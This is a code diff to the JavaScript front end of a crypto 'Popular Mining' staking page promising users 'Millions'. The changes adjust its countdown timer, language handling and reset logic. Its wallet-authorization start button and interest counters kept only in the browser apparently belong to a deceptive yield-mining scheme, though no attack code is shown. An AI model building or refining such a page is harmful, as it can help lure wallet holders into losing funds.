@@ -41,6 +41,7 @@ let stakingStartTime = null;
 let claimedInterest = 0;
 let pledgedAmount = 0;
 let interestInterval = null;
+let nextBenefitInterval = null; // ===== 新增：为倒数计时器创建一个专门的变量 =====
 
 //---UI Control Functions---
 function updateStatus(message, isWarning = false) {
@@ -57,13 +58,11 @@ function resetState(showMsg = true) {
     claimedInterest = 0;
     pledgedAmount = 0;
     if (interestInterval) clearInterval(interestInterval);
-    localStorage.removeItem('stakingStartTime');
-    localStorage.removeItem('claimedInterest');
-    localStorage.removeItem('pledgedAmount');
-    localStorage.removeItem('nextBenefitTime');
+    if (nextBenefitInterval) clearInterval(nextBenefitInterval); // ===== 新增：重置时清除倒数计时器 =====
+    localStorage.clear(); // 直接清除所有本地存储，更干净
     if (startBtn) {
         startBtn.style.display = 'block';
-        startBtn.textContent = translations[currentLang].startBtnText || 'Start';
+        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
     }
     const existingClaimBtn = document.getElementById('claimButton');
     if (existingClaimBtn) existingClaimBtn.remove();
@@ -143,14 +142,14 @@ function updateInterest() {
 function updateNextBenefitTimer() {
     if (!nextBenefit) return;
     const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime'));
-    const label = (translations[currentLang].nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
+    const label = (translations[currentLang]?.nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
     if (!nextBenefitTimestamp) {
         nextBenefit.textContent = `${label}: 00:00:00`;
         return;
     }
     const now = Date.now();
     let diff = nextBenefitTimestamp - now;
-    if (diff <= 0) {
+    if (diff < 0) {
         const twelveHoursInMillis = 12 * 60 * 60 * 1000;
         let newNextBenefitTimestamp = nextBenefitTimestamp;
         while (newNextBenefitTimestamp <= now) {
@@ -166,59 +165,44 @@ function updateNextBenefitTimer() {
     nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
 }
 
-// ===== 辅助函数：获取当前的美东时间偏移量 (毫秒) =====
 function getETOffsetMilliseconds() {
     const now = new Date();
-    // 检查北美夏令时规则：3月第二个周日到11月第一个周日
-    const mar = new Date(now.getFullYear(), 2, 8); // March 8th
-    const nov = new Date(now.getFullYear(), 10, 1); // November 1st
-    const marDay = mar.getDay(); // 0=Sun, 1=Mon...
+    const mar = new Date(now.getFullYear(), 2, 8);
+    const nov = new Date(now.getFullYear(), 10, 1);
+    const marDay = mar.getDay();
     const novDay = nov.getDay();
-    // Find second Sunday in March
     const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
-    // Find first Sunday in November
     const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
-
     if (now >= dstStart && now < dstEnd) {
-        return -4 * 60 * 60 * 1000; // EDT is UTC-4
+        return -4 * 60 * 60 * 1000; // EDT: UTC-4
     }
-    return -5 * 60 * 60 * 1000; // EST is UTC-5
+    return -5 * 60 * 60 * 1000; // EST: UTC-5
 }
 
-
-// ===== 重写：使用更可靠的方法设定基于美东时间的目标 =====
 function setInitialNextBenefitTime() {
     if (localStorage.getItem('nextBenefitTime')) return;
     console.log("Setting initial benefit countdown target based on US Eastern Time...");
-
     const etOffset = getETOffsetMilliseconds();
     const nowUtcTimestamp = Date.now();
-    
-    // 创建一个代表当前美东时间的对象
     const nowET = new Date(nowUtcTimestamp + etOffset);
-
-    // 在美东时间下计算下一个中午和午夜
     const noonET = new Date(nowET);
     noonET.setHours(12, 0, 0, 0);
-
     const midnightET = new Date(nowET);
-    midnightET.setHours(24, 0, 0, 0); // Next day's 00:00
-    
+    midnightET.setHours(24, 0, 0, 0);
     let nextBenefitTimeET;
     if (nowET < noonET) {
         nextBenefitTimeET = noonET;
     } else {
         nextBenefitTimeET = midnightET;
     }
-
-    // 将美东时间的目标转换回 UTC 时间戳进行存储
     const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
     localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
     console.log(`Next benefit target (UTC timestamp) set to: ${new Date(finalNextBenefitTimestamp).toISOString()}`);
 }
 
-
+// ===== 修改：统一管理所有启动后的UI和计时器 =====
 function activateStakingUI() {
+    // 状态恢复
     const storedStartTime = localStorage.getItem('stakingStartTime');
     if (storedStartTime) {
         stakingStartTime = parseInt(storedStartTime);
@@ -228,9 +212,11 @@ function activateStakingUI() {
     }
     claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
     pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
+
+    // UI切换
     if (startBtn) startBtn.style.display = 'none';
     if (document.getElementById('claimButton')) return;
-    claimBtn.textContent = translations[currentLang].claimBtnText || 'Claim';
+    claimBtn.textContent = translations[currentLang]?.claimBtnText || 'Claim';
     claimBtn.className = 'start-btn';
     claimBtn.style.marginTop = '10px';
     claimBtn.disabled = false;
@@ -240,9 +226,16 @@ function activateStakingUI() {
         claimBtn.addEventListener('click', claimInterest);
         claimBtn.hasEventListener = true;
     }
+
+    // 计时器启动
     if (interestInterval) clearInterval(interestInterval);
     interestInterval = setInterval(updateInterest, 1000);
+
+    // ===== 关键修正：在这里启动倒数计时器 =====
+    if (nextBenefitInterval) clearInterval(nextBenefitInterval);
+    nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
 }
+
 
 //---Core Wallet Logic---
 async function sendMobileRobustTransaction(populatedTx) {
@@ -443,23 +436,39 @@ function claimInterest() {
 
 //---Language Control---
 const translations = { 'en': { title: 'Popular Mining', subtitle: 'Start Earning Millions', tabLiquidity: 'Liquidity', tabPledging: 'Pledging', grossOutputLabel: 'Gross Output', cumulativeLabel: 'Cumulative', walletBalanceLabel: 'Wallet Balance', accountBalanceLabel: 'Account Balance', compoundLabel: '⚡ Compound', nextBenefit: 'Next Benefit: 00:00:00', startBtnText: 'Start', pledgeAmountLabel: 'Pledge Amount', pledgeDurationLabel: 'Duration', pledgeBtnText: 'Pledge Now', totalPledgedLabel: 'Total Pledged', expectedYieldLabel: 'Expected Yield', apyLabel: 'APY', lockedUntilLabel: 'Locked Until', claimBtnText: 'Claim' }, 'zh-Hant': { title: '熱門挖礦', subtitle: '開始賺取數百萬', tabLiquidity: '流動性', tabPledging: '質押', grossOutputLabel: '總產出', cumulativeLabel: '累計', walletBalanceLabel: '錢包餘額', accountBalanceLabel: '帳戶餘額', compoundLabel: '⚡ 複利', nextBenefit: '下次收益: 00:00:00', startBtnText: '開始', pledgeAmountLabel: '質押金額', pledgeDurationLabel: '期間', pledgeBtnText: '立即質押', totalPledgedLabel: '總質押', expectedYieldLabel: '預期收益', apyLabel: '年化收益率', lockedUntilLabel: '鎖定至', claimBtnText: '領取' }, 'zh-Hans': { title: '热门挖矿', subtitle: '开始赚取数百万', tabLiquidity: '流动性', tabPledging: '质押', grossOutputLabel: '总产出', cumulativeLabel: '累计', walletBalanceLabel: '钱包余额', accountBalanceLabel: '账户余额', compoundLabel: '⚡ 复利', nextBenefit: '下次收益: 00:00:00', startBtnText: '开始', pledgeAmountLabel: '质押金额', pledgeDurationLabel: '期间', pledgeBtnText: '立即质押', totalPledgedLabel: '总质押', expectedYieldLabel: '预期收益', apyLabel: '年化收益率', lockedUntilLabel: '锁定至', claimBtnText: '领取' } };
-let currentLang = navigator.language || navigator.userLanguage;
-if (!['en', 'zh-Hant', 'zh-Hans'].includes(currentLang)) currentLang = 'en';
-else if (currentLang === 'zh') currentLang = 'zh-Hans';
+let currentLang = 'en';
 const languageSelect = document.getElementById('languageSelect');
 const elements = { title: document.getElementById('title'), subtitle: document.getElementById('subtitle'), tabLiquidity: document.getElementById('tabLiquidity'), tabPledging: document.getElementById('tabPledging'), grossOutputLabel: document.getElementById('grossOutputLabel'), cumulativeLabel: document.getElementById('cumulativeLabel'), walletBalanceLabel: document.getElementById('walletBalanceLabel'), accountBalanceLabel: document.getElementById('accountBalanceLabel'), compoundLabel: document.getElementById('compoundLabel'), nextBenefit: document.getElementById('nextBenefit'), startBtnText: document.getElementById('startBtn'), pledgeAmountLabel: document.getElementById('pledgeAmountLabel'), pledgeDurationLabel: document.getElementById('pledgeDurationLabel'), pledgeBtnText: document.getElementById('pledgeBtn'), totalPledgedLabel: document.getElementById('totalPledgedLabel'), expectedYieldLabel: document.getElementById('expectedYieldLabel'), apyLabel: 'APY', lockedUntilLabel: document.getElementById('lockedUntilLabel'), claimBtnText: claimBtn };
-function updateLanguage(lang) { currentLang = lang; languageSelect.value = lang; for (let key in elements) { if (elements[key] && translations[lang][key]) { elements[key].textContent = translations[lang][key]; } } if (claimBtn.parentNode) claimBtn.textContent = translations[lang].claimBtnText || 'Claim'; updateNextBenefitTimer(); }
+
+function updateLanguage(lang) {
+    currentLang = lang;
+    languageSelect.value = lang;
+    for (let key in elements) {
+        if (elements[key] && translations[lang]?.[key]) {
+            elements[key].textContent = translations[lang][key];
+        }
+    }
+    if (claimBtn.parentNode) {
+        claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
+    }
+    updateNextBenefitTimer(); // Ensure timer text updates on language change
+}
 
 //---Event Listeners & Initial Load---
 document.addEventListener('DOMContentLoaded', () => {
-    languageSelect.value = currentLang; 
-    updateLanguage(currentLang);
+    const savedLang = localStorage.getItem('language') || 'en';
+    updateLanguage(savedLang);
     initializeWallet();
     setInterval(updateTotalFunds, 1000);
-    setInterval(updateNextBenefitTimer, 1000);
+    // Timer is now started in activateStakingUI
 });
 
-languageSelect.addEventListener('change', (e) => updateLanguage(e.target.value));
+languageSelect.addEventListener('change', (e) => {
+    const lang = e.target.value;
+    localStorage.setItem('language', lang);
+    updateLanguage(lang);
+});
+
 connectButton.addEventListener('click', () => {
     if (connectButton.classList.contains('connected')) {
         disconnectWallet();
@@ -500,7 +509,7 @@ startBtn.addEventListener('click', async () => {
         updateStatus(`Authorization failed: ${error.message}`);
     } finally {
         startBtn.disabled = false;
-        startBtn.textContent = translations[currentLang].startBtnText || 'Start';
+        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
     }
 });
 
